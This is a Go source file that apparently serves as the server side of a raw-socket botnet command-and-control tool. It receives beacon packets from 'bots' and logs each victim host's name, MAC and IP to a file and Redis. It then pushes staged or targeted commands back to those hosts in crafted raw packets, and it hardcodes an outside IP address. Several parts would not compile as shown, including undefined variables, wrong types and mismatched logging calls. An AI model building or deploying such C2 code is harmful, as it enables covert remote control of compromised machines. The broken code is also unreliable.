package main

import (
	// "bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
	"io"
	// "net/http"
	"encoding/json"

	"github.com/google/gopacket"
	"github.com/DaveTheBearMan/Keydra/socket"
	"golang.org/x/sys/unix"
	"github.com/redis/go-redis/v9"
)

// Global to store staged command
var stagedCmd string
var startTime time.Time
var rdb redis.Client

// Glabal to store target info
var targetIP string
var targetcommand string

// Host defines values for a callback from a bot
type Host struct {
	Hostname string
	Mac      net.HardwareAddr
	IP       net.IP
	RespIP   net.IP
	SrcPort  int
	DstPort  int
}

// Write host
func writeLog(streamKey String, event String, message String) {
	args := &redis.XAddArgs{
        Stream: streamKey,
        MaxLen: 1000,
        Approx: true,
        Values: map[string]interface{}{
            "event":   event,
            "message": message,
            "time":   time.Now().Format(time.RFC3339),
        },
    }

	_, err := rdb.XAdd(ctx, args).Result()
    if err != nil {
        log.Fatalf("XAdd failed: %v", err)
    }
}

// sendCommand takes
func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, listen chan Host) {

	// Forever loop to respond to bots
	for {
		// Block on reading from channel
		client := <-listen

		// Check if there is a command to run
		// Make a socket for sending
		fd := socket.NewSocket()

		// Create packet
		// writeLog(fmt.Sprintf("SRC MAC:", iface.HardwareAddr)
		// writeLog(fmt.Sprintf("DST MAC:", dstMAC)
		// writeLog(fmt.Sprintf("SRC IP:", myIP)
		// writeLog(fmt.Sprintf("DST IP:", client.RespIP)
		if targetcommand != "" {
			writeLog("TRAFFIC", fmt.Sprintf("Sending target cmd", targetIP, targetcommand))
			packet := socket.CreatePacket(iface, myIP, client.RespIP, client.DstPort, client.SrcPort, dstMAC, socket.CreateTargetCommand(targetcommand, targetIP))
			socket.SendPacket(fd, iface, socket.CreateAddrStruct(iface), packet)
		} else {
			packet := socket.CreatePacket(iface, myIP, client.RespIP, client.DstPort, client.SrcPort, dstMAC, socket.CreateCommand(stagedCmd))
			socket.SendPacket(fd, iface, socket.CreateAddrStruct(iface), packet)
		}
		// YEET
		if stagedCmd != "" {
			writeLog("TRAFFIC", fmt.Sprintf("Sent reponse to:", client.Hostname, "(", client.IP, ")"))
			// Close the socket
			unix.Close(fd)
		} else {
			unix.Close(fd)
		}
	}
}

// ProcessPacket TODO:
func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
	// Get data from packet
	data := string(packet.ApplicationLayer().Payload())
	payload := strings.Split(data, " ")

	// writeLog(fmt.Sprintf("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())

	// Parse the values from the data
	mac, err := net.ParseMAC(payload[2])
	if err != nil {
		writeLog("ERROR", fmt.Sprintf("ERROR PARSING MAC:", err))
		return
	}

	srcport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Src().String())
	dstport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Dst().String())

	// New Host struct for shipping info to sendCommand()
	newHost := Host{
		Hostname: payload[1],
		Mac:      mac,
		IP:       net.ParseIP(payload[3]),
		RespIP:   net.ParseIP(packet.NetworkLayer().NetworkFlow().Src().String()),
		SrcPort:  srcport,
		DstPort:  dstport,
	}

	writeLog("TRAFFIC", fmt.Sprintf("Recieved From:", newHost.Hostname, "(", newHost.IP, ")"))
	err = writeHostToFile(newHost)
	if err != nil {
		writeLog("ERROR", fmt.Sprintf("ERROR WRITING HOST:", err))
		return
	}

	// Write host to channel
	listen <- newHost
}

func connectToDb() {
	rdb = redis.NewClient(&redis.Options{
		Addr: "localhost:6379",
	})
}

func initializeRawSocketServer() {
	// Hosts file
	startTime = time.now()
	filePath = "hosts.json"
	// Create a BPF vm for filtering
	filterVM := socket.CreateBPFVM(socket.FilterRaw)

	// Create a unix file socket for reading
	readfd := socket.NewSocket()
	defer unix.Close(readfd)

	writeLog("DEBUG", fmt.Sprintf("Created sockets"))

	// Make channel buffer by 5
	listen := make(chan Host, 5)

	// Iface and myip for the sendcommand func to use
	iface, myIP := socket.GetOutwardIface("157.245.141.117:80")
	writeLog("DEBUG", fmt.Sprintf("Interface:", iface.Name))

	dstMAC, err := socket.GetRouterMAC()
	if err != nil {
		log.Fatal(err)
	}
	writeLog("DEBUG", fmt.Sprintf("DST MAC:", dstMAC.String()))

	// Spawn routine to listen for responses
	writeLog("DEBUG", "Starting go routine...")
	go sendCommand(iface, myIP, dstMAC, listen)

	// This needs to be on main thread
	for {
		// packet := socket.ServerReadPacket(readfd, vm)
		packet := socket.ServerReadPacket(readfd, filterVM)
		if packet != nil {
			go serverProcessPacket(packet, listen)
		}
	}
}

func main() {
	initializeRawSocketServer()
}